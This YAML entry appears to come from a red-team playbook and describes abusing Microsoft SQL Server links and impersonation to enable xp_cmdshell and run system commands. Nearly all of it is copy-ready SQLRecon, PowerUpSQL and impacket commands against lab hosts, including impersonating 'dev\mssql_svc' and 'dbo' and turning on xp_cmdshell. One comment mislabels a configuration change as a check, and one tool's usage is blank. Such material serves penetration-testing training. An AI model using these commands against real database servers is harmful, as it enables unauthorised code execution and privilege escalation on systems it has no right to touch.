title: Execute commands using MSSQL
category: 
  - AD:
    - MSSQL
tactic: Privilege Escalation
tags: []

description: SQL Servers have a concept called "links", which allows a database instance to access data from an 
  external source.  MS SQL supports multiple sources, including other MS SQL Servers. 
  These can also be practically anywhere - including other domains, forests or in the cloud.

references:

steps: 
  - description: Discover links
    options: 
      - tool: SQLRecon.exe
        usage: 
      
      - tool: PowerUpSQL
        usage: |
          Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
    
  - description: Enable xp_cmdshell
    options: 
      - tool: SQLRecon.exe
        usage: |
          #check if xp_cmdshell is enabled
          SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m query -o "EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]"

          #enable it if necessary
          #non-impersonated version
          SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m enablexp 

          #impersonated
          SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m ienablexp -i dev\mssql_svc
      
      - tool: impacket
        usage: |
          SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' 
          use msdb; EXECUTE AS USER = 'dbo'; 
          EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 

  - description: Command execution using xp_cmdshell
    options: 
      - tool: SQLRecon.exe
        usage: |
          SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m query -o "EXEC xp_cmdshell 'whoami';"

          #with impersonation
          SQLRecon.exe -a windows -s sql-2.dev.cyberbotic.io,1433 -m iquery -i dev\mssql_svc -o "EXEC xp_cmdshell 'whoami';"
          
      - tool: impacket
        usage: |
          EXEC xp_cmdshell whoami;

          #with impersonation
          use msdb; EXECUTE AS USER = 'dbo'; 
          EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
          EXEC xp_cmdshell whoami


